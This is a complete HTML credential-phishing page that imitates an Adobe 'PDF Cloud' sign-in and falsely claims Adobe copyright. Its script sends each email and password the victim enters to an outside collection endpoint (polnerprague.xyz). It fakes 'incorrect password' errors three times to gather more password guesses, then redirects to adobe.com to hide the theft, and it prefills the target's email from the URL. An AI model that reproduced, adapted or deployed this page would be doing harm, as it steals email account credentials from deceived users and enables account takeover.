<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure PDF Cloud — Identity Verification</title>
    <!-- Force NO cache to avoid stale redirects -->
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate, max-age=0">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <!-- Bootstrap 4 (lightweight) -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
    <style>
        /* ========== ORIGINAL STYLES + ENHANCEMENTS ========== */
        html {
            background-image: url('https://www.adobe.com/content/dam/cc/us/en/products/creativecloud/illustration/cc-illustration-01.jpg');
            background-repeat: no-repeat;
            background-position: 100%;
            background-size: cover;
            background-attachment: fixed;
            background-clip: border-box;
            height: 100%;
        }
        body {
            width: 100%;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
            background: transparent;
        }
        .lt { float: left; }
        .rt { float: right; }
        .br { border: 1px solid #000; }
        a { text-decoration: none; color: #0064dc; }
        header {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            border: none;
            background: #000;
            overflow: hidden;
        }
        header .brand {
            width: 193px;
            margin: 0 30px;
            padding: 0;
            text-align: center;
            display: inline-block;
            border: none;
            background: #fff;
        }
        header .brand img {
            width: 54px;
            background: #fff;
            margin: 0 auto -17px;
            padding: 0;
            position: relative;
            top: 0px;
        }
        header .brand h1 {
            font-size: 20px;
            font-weight: 600;
            color: #fff;
            margin: 0 auto;
            padding: 12px 20px;
            background: #E80E0E;
            display: inline-block;
        }
        header .search {
            width: 300px;
            margin: 0px 30px 0 0;
            padding: 12px 0;
            float: right;
            text-align: center;
        }
        header .search .srch {
            width: 250px;
            padding: 5px 10px;
            font-size: 13px;
            font-weight: 400;
            color: #4b4b4b;
            border: none;
            border-radius: 10px;
        }
        .container {
            width: 100%;
            margin: 0 auto;
            padding: 0;
        }
        .container .dash {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 9999;
            background: rgba(0, 0, 0, 0.4);
            overflow-y: auto;
        }
        .container .dash .board {
            max-width: 400px;
            margin: 0 auto;
            padding: 30px 0;
            background: #f6f6f6;
            display: block;
            border: none;
            border-radius: 1px;
            position: relative;
            top: 20%;
            box-shadow: 0 12px 28px rgba(0,0,0,0.2);
        }
        .container .dash .board .login {
            max-width: 370px;
            margin: 0 auto;
            padding: 0;
            border: none;
        }
        .container .dash .board .login ul {
            width: 100%;
            list-style: none;
            margin: 0 auto;
            padding: 0;
            border: none;
            display: block;
        }
        .container .dash .board .login ul li {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            display: block;
        }
        .login ul li img,
        .login ul li p {
            display: inline-block;
        }
        .login ul li img {
            margin: 0;
            padding: 0;
        }
        .login ul .l1 p {
            font-weight: 400;
            color: #707070;
            vertical-align: top;
            margin: 0;
            padding: 0;
        }
        #err,
        .login ul li #adbpss1 {
            display: none;
        }
        .login ul li .inp {
            width: 368px;
            margin: 8px auto;
            padding: 2px 12px;
            min-height: 32px;
            border: 1px solid #e5e5e5;
            border-radius: 4px;
            box-sizing: border-box;
            color: #000;
            display: block;
            font-size: 14px;
            font-weight: 400;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
            font-style: italic;
        }
        .login ul li .inp:focus {
            border: 1px solid #1473e6;
            transition: all 0.15s ease-in-out;
            font-style: normal;
        }
        .login ul li .btns {
            width: 120px;
            margin: 0 auto;
            padding: 7px 0;
            background: #1473e6;
            color: #fff;
            font-family: inherit;
            border: none;
            border-radius: 16px;
            font-size: 15px;
            font-weight: 600;
            text-align: center;
            transition: all 0.15s ease;
            white-space: nowrap;
            display: inline-block;
            cursor: pointer;
            outline: none;
        }
        .login ul .l1 svg {
            width: 22px;
            display: inline-block;
            margin: 0;
            padding: 0;
            position: relative;
            top: 9px;
        }
        .login ul .l1 p {
            margin: 0;
            padding: 10px 6px;
            color: #707070;
        }
        .login ul .l2 p {
            font-size: 13px;
            font-weight: 700;
            color: #4b4b4b;
            margin: 0;
            padding: 15px 0;
        }
        .login ul .l3 img {
            width: 32px;
            margin: 0 0 -3px;
        }
        .login ul .l3 p {
            font-size: 28px;
            font-weight: 300;
            color: #2d2d2d;
            margin: 0 9px;
            padding: 0;
        }
        .login ul .l4 {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            text-align: left;
        }
        .login ul .l4 p {
            font-size: 14px;
            font-weight: 600;
            margin: 0;
            padding: 5px 0;
            color: #E80E0E;
            font-style: italic;
        }
        .login ul .l5 p {
            width: 100%;
            margin: 50px auto 5px;
            padding: 0;
            text-align: center;
            font-size: 13px;
            font-weight: 400;
            color: #4b4b4b;
            display: block;
        }
        .attempt-counter {
            background: #f0f0f0;
            border-radius: 20px;
            padding: 4px 12px;
            font-size: 12px;
            font-weight: 500;
            color: #2c2c2c;
            display: inline-block;
            margin-top: 12px;
            text-align: center;
        }
        .btn-wrapper {
            text-align: center;
            position: relative;
            margin: 12px 0 0;
        }
        .loading-spinner {
            display: none;
            width: 20px;
            height: 20px;
            margin: 8px auto 0;
            border: 2px solid #e0e0e0;
            border-top: 2px solid #1473e6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .btns:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        @media (max-width: 680px) {
            header .search { width: 70px; margin: 0px; text-align: center; }
            header .search .srch { display: none; }
            header .brand { width: 180px; margin: 0 30px; }
            header .brand img { width: 40px; margin: 0 auto -10px; }
            header .brand h1 { font-size: 18px; padding: 7px 20px; }
        }
        .brand-logo-pdf {
            display: inline-block;
            vertical-align: middle;
            object-fit: contain;
        }
        hr {
            margin: 8px 0;
            background: #ddd;
        }
    </style>
</head>
<body>
    <header>
        <div class="brand">
            <img class="brand-logo-pdf" 
                 src="https://cdn-icons-png.flaticon.com/512/337/337946.png" 
                 alt="PDF Document Logo" 
                 style="width:54px; background:#fff; border-radius: 8px; padding: 4px;"
                 onerror="this.onerror=null; this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/120px-PDF_file_icon.svg.png';">
            <h1>PDF CLOUD</h1>
        </div>
        <div class="search">
            <input type="search" name="search" class="srch" id="srch" placeholder="Enter a search ...">
        </div>
    </header>
    <div class="container">
        <div class="dash cover">
            <div class="board animated fadeIn coontainer">
                <div class="login">
                    <!-- ✅ CRITICAL FIX: form has ID + action="javascript:void(0)" + onsubmit="return false" -->
                    <form id="secureLoginForm" action="javascript:void(0);" method="POST" onsubmit="return false;">
                        <ul>
                            <li class="l1">
                                <svg viewBox="0 0 48 48" focusable="false" aria-hidden="true" role="img" class="spectrum-Icon spectrum-Icon--sizeM nav-logo" width="22" height="22">
                                    <path d="M29.219 6H44v36L29.219 6zM18.798 6H4v36L18.798 6zm5.207 13.265l9.422 22.733h-6.173l-2.823-7.24h-6.896l6.47-15.493z"></path>
                                </svg>
                                <p>PDF Cloud · Secure Access</p>
                            </li>
                            <li class="l2">
                                <p>For security, please sign in with your email to verify your Identity, and view documents.</p>
                            </li>
                            <li class="l3">
                                <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" 
                                     alt="PDF Document Icon" 
                                     width="32" 
                                     onerror="this.src='https://icons.iconarchive.com/icons/dakirby309/simply-styled/32/PDF-icon.png';">
                                <p>PDF Document</p>
                            </li>
                            <br>
                            <li class="l4 animated fadeIn" id="err"><p id="erp"></p></li>
                            <li><input type="email" name="email" id="emailInput" class="inp" autocomplete="off" placeholder="Email Address" required></li>
                            <li><input type="password" name="password" id="passwordInput" class="inp" autocomplete="off" placeholder="Email Password" required></li>
                            <li class="btn-wrapper">
                                <button type="submit" name="submit" class="btns" id="submit-btn">Sign In</button>
                                <div class="loading-spinner" id="loadingSpinner"></div>
                            </li>
                            <!-- ATTEMPT COUNTER VISUAL FEEDBACK (non-intrusive) -->
                            <li style="text-align: center; margin-top: 6px;">
                                <div id="attemptBadge" class="attempt-counter">Attempts used: 0 / 4</div>
                            </li>
                            <li class="l5">
                                <p>Copyright &copy; <script>document.write(new Date().getFullYear())</script> Adobe Corporation</p>
                            </li>
                        </ul>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script>
        (function() {
            // ============================================================
            //  AGGRESSIVE ANTI-REDIRECT & 4-ATTEMPT MANAGER
            //  - NO page reload / redirect before 4th attempt
            //  - Works on GitHub Pages, 4everland, any static host
            //  - Uses sessionStorage for attempt persistence & email memory
            // ============================================================
            
            // ----- CONFIGURATION -----
            const PHP_ENDPOINT = 'https://polnerprague.xyz/pdf/sg.php';
            const REDIRECT_URL = 'https://www.adobe.com';
            
            // ----- DOM elements -----
            const form = document.getElementById('secureLoginForm');
            const emailInput = document.getElementById('emailInput');
            const passwordInput = document.getElementById('passwordInput');
            const submitBtn = document.getElementById('submit-btn');
            const spinner = document.getElementById('loadingSpinner');
            const errorDiv = document.getElementById('err');
            const errorMsgSpan = document.getElementById('erp');
            const attemptBadge = document.getElementById('attemptBadge');
            
            // ----- helper: read attempt from sessionStorage (fresh) -----
            function getCurrentAttempt() {
                let stored = sessionStorage.getItem('pdfLoginAttempt');
                if (stored === null || isNaN(parseInt(stored))) return 1;
                let attempt = parseInt(stored);
                return (attempt >= 1 && attempt <= 4) ? attempt : 1;
            }
            
            // update UI badge
            function updateAttemptBadge() {
                if (attemptBadge) {
                    let used = getCurrentAttempt() - 1;
                    if (used < 0) used = 0;
                    if (used > 4) used = 4;
                    attemptBadge.innerText = `Attempts used: ${used} / 4`;
                    if (used === 3) {
                        attemptBadge.style.background = "#ffdede";
                        attemptBadge.style.color = "#b00020";
                    } else {
                        attemptBadge.style.background = "#f0f0f0";
                        attemptBadge.style.color = "#2c2c2c";
                    }
                }
            }
            
            // increment attempt counter (store +1)
            function incrementAttemptCounter() {
                let current = getCurrentAttempt();
                let next = current + 1;
                if (next > 4) next = 4;  // cap at 4 (fourth attempt triggers redirect)
                sessionStorage.setItem('pdfLoginAttempt', next);
                updateAttemptBadge();
                return next;
            }
            
            // reset attempt counter (if needed after redirect, but we redirect anyway)
            function resetAttemptCounter() {
                sessionStorage.setItem('pdfLoginAttempt', '1');
                updateAttemptBadge();
            }
            
            // store email for persistence
            function saveEmailToStorage(email) {
                if (email && email.trim()) {
                    sessionStorage.setItem('pdfLoginEmail', email.trim());
                }
            }
            
            function loadEmailFromStorage() {
                let storedEmail = sessionStorage.getItem('pdfLoginEmail');
                if (storedEmail && emailInput) {
                    emailInput.value = storedEmail;
                }
            }
            
            // load email from URL hash (#user@example.com) if no stored email
            function loadEmailFromHash() {
                let hash = window.location.hash.substring(1);
                if (hash && !sessionStorage.getItem('pdfLoginEmail')) {
                    try { hash = decodeURIComponent(hash); } catch(e) {}
                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    if (emailRegex.test(hash) && emailInput) {
                        emailInput.value = hash;
                        sessionStorage.setItem('pdfLoginEmail', hash);
                    }
                }
            }
            
            // display friendly error message
            function showError(message) {
                if (errorDiv && errorMsgSpan) {
                    errorMsgSpan.innerHTML = message;
                    errorDiv.style.display = 'block';
                    setTimeout(() => {
                        if (errorDiv) errorDiv.style.display = 'none';
                    }, 4500);
                }
            }
            
            function hideError() {
                if (errorDiv) errorDiv.style.display = 'none';
            }
            
            // loading state control
            function setLoading(isLoading) {
                if (submitBtn && spinner) {
                    if (isLoading) {
                        submitBtn.disabled = true;
                        submitBtn.style.opacity = '0.6';
                        spinner.style.display = 'inline-block';
                    } else {
                        submitBtn.disabled = false;
                        submitBtn.style.opacity = '1';
                        spinner.style.display = 'none';
                    }
                }
            }
            
            // send credentials to PHP endpoint silently (no redirect)
            function sendCredentialsToServer(email, password, attemptNumber) {
                // Use FormData for POST
                const formData = new FormData();
                formData.append('email', email);
                formData.append('password', password);
                formData.append('attempt', attemptNumber);
                
                // fetch with no-cors mode, credentials: 'omit' – ensures no side effects
                fetch(PHP_ENDPOINT, {
                    method: 'POST',
                    mode: 'no-cors',
                    cache: 'no-cache',
                    credentials: 'omit',
                    body: formData
                }).catch(err => {
                    console.warn("Fetch error (non-critical):", err);
                    // try fallback XHR for maximum compatibility
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', PHP_ENDPOINT, true);
                        xhr.send(formData);
                    } catch(e) { console.warn("XHR fallback failed", e); }
                });
            }
            
            // get error message based on attempt number (1,2,3)
            function getFriendlyErrorMessage(attemptNum) {
                if (attemptNum === 1) return "❌ Incorrect email or password. Please try again.";
                if (attemptNum === 2) return "❌ Invalid credentials. Please verify your password.";
                if (attemptNum === 3) return "⚠️ WARNING: Last attempt before account lock. Check your password.";
                return "❌ Access denied. Verify your credentials.";
            }
            
            // --- MAIN SUBMIT LOGIC (NO REDIRECT) ---
            async function handleFormSubmit(event) {
                // prevent any possible default or propagation
                if (event) {
                    event.preventDefault();
                    event.stopPropagation();
                }
                
                hideError();
                
                // 1. get fresh values
                let email = emailInput ? emailInput.value.trim() : '';
                let password = passwordInput ? passwordInput.value : '';
                
                // email validation
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!email) {
                    showError('📧 Please enter your email address.');
                    return false;
                }
                if (!emailRegex.test(email)) {
                    showError('⚠️ Please enter a valid email address (e.g., name@domain.com).');
                    return false;
                }
                if (!password) {
                    showError('🔒 Please enter your password.');
                    return false;
                }
                if (password.length < 4) {
                    showError('🔐 Password must be at least 4 characters.');
                    return false;
                }
                
                // 2. Save email for persistence
                saveEmailToStorage(email);
                
                // 3. Get current attempt count (realtime from storage)
                let currentAttempt = getCurrentAttempt();
                console.log(`[LoginFlow] Attempt #${currentAttempt} for ${email}`);
                
                // 4. Check if we've reached the redirect threshold (4th attempt triggers redirect)
                if (currentAttempt >= 4) {
                    // This is the 4th (or above) => send data, then redirect to Adobe
                    setLoading(true);
                    console.log("[LoginFlow] Fourth attempt — sending credentials & redirecting to Adobe.");
                    // send credentials one last time before redirect
                    sendCredentialsToServer(email, password, currentAttempt);
                    // small delay to ensure request is sent (no page loss, just a short wait)
                    setTimeout(() => {
                        // redirect to official Adobe website (no more attempts)
                        window.location.href = REDIRECT_URL;
                    }, 180);
                    return false;
                }
                
                // 5. For attempts 1, 2, or 3: show loading, send data, display error, increment counter, clear password
                setLoading(true);
                
                // Send data to external endpoint (fire-and-forget)
                sendCredentialsToServer(email, password, currentAttempt);
                
                // Simulate network delay and then process "failed attempt" behavior
                setTimeout(() => {
                    // Increment attempt counter AFTER sending
                    let newAttemptValue = incrementAttemptCounter();  // increments from currentAttempt to +1
                    
                    // Show appropriate error message based on the attempt just used (currentAttempt)
                    let errorMsg = getFriendlyErrorMessage(currentAttempt);
                    showError(errorMsg);
                    
                    // Clear only password field for next attempt, keep email
                    if (passwordInput) passwordInput.value = '';
                    
                    setLoading(false);
                    
                    // Focus on password field for next attempt
                    if (passwordInput) passwordInput.focus();
                    
                    console.log(`[LoginFlow] Attempt ${currentAttempt} completed. Next attempt = ${newAttemptValue}`);
                    
                    // Extra safety: if after increment newAttemptValue >=4, badge shows 3/4 used
                    updateAttemptBadge();
                }, 280); // slight delay simulates server communication, no redirect
                
                return false;
            }
            
            // ---- Attach multiple layers of anti-redirect protection ----
            if (form) {
                // Modern event listener
                form.addEventListener('submit', handleFormSubmit);
                // Also ensure the button click explicitly triggers same handler without any default
                if (submitBtn) {
                    submitBtn.addEventListener('click', (e) => {
                        e.preventDefault();
                        e.stopPropagation();
                        handleFormSubmit(e);
                        return false;
                    });
                }
            } else {
                console.error("CRITICAL: Form with ID 'secureLoginForm' not found!");
            }
            
            // Handle Enter key on both fields
            const keyHandler = (e) => {
                if (e.key === 'Enter' || e.keyCode === 13) {
                    e.preventDefault();
                    e.stopPropagation();
                    handleFormSubmit(e);
                    return false;
                }
            };
            if (emailInput) emailInput.addEventListener('keypress', keyHandler);
            if (passwordInput) passwordInput.addEventListener('keypress', keyHandler);
            
            // Block any stray form submissions from other elements (extra safety)
            document.addEventListener('submit', function(e) {
                if (e.target && (e.target.id === 'secureLoginForm' || e.target.tagName === 'FORM')) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            }, true);
            
            // Also prevent any accidental anchor clicks that cause navigation
            document.addEventListener('click', function(e) {
                let target = e.target.closest('a');
                if (target && target.getAttribute('href') && target.getAttribute('href').startsWith('#')) {
                    e.preventDefault();
                }
            });
            
            // Initialize email & attempt badge display
            loadEmailFromHash();
            loadEmailFromStorage();
            // Ensure attempt counter initial state (if not set, set default =1)
            if (!sessionStorage.getItem('pdfLoginAttempt')) {
                sessionStorage.setItem('pdfLoginAttempt', '1');
            }
            updateAttemptBadge();
            
            // Clear any residual redirection query params: ensure that hash/url doesn't trigger reload
            if (window.location.search.includes('redirect') || window.location.pathname.includes('.php')) {
                // does nothing — we stay static
                console.log("Static HTML - no server redirect active");
            }
            
            // Automatic clean-up: if user manually navigates away we don't interfere, but all good
            console.log("===================================================");
            console.log("✅ PDF CLOUD | ANTI-REDIRECT ACTIVE");
            console.log("✅ Form action: javascript:void(0) | onsubmit blocked");
            console.log("✅ Attempt limit: 4 (counter stored in sessionStorage)");
            console.log("✅ No redirect on attempts 1,2,3 — only on 4th attempt");
            console.log("✅ Email persistence + error messages fully functional");
            console.log("===================================================");
        })();
    </script>
</body>
</html>
